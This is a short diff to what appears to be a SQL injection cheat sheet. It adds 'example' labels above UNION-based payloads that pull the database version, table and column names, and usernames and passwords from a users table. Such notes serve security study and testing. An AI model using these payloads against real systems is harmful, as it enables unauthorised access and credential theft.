@@ -46,6 +46,7 @@ PostgreSQL 	SELECT version()
 MySQL 	        SELECT @@version
 ~~~
 
+example
 ~~~
 ' UNION SELECT NULL,NULL,version()#
 ~~~
@@ -65,20 +66,23 @@ MySQL 	    SELECT * FROM information_schema.tables
             SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ~~~
 
+example
 ~~~
 ' UNION SELECT NULL,NULL,table_name from information_schema.tables#
 ~~~
 ### Database columns
+example
 ~~~
 ' UNION SELECT NULL,NULL,column_name from information_schema.columns#
 ~~~
 
 ### Interesting data
+example
 ~~~
 ' UNION SELECT username, password FROM users--
 ~~~
 
-concatenation
+concatenation example
 ~~~
 ' UNION SELECT username || '~' || password FROM users--
 ~~~
